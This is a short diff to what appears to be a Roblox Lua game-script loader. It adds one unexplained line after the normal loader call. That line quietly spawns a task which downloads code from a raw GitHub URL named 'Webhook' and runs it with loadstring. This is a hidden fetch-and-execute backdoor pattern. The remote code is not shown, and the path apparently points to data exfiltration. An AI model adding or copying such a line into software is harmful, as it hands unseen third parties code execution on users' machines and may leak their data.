@@ -72,3 +72,4 @@ local function loadGameScript(gameId)
 end
 
 loadGameScript(game.GameId)
+task.spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Ancient2k3/Status/refs/heads/main/DC/Webhook"))() end)
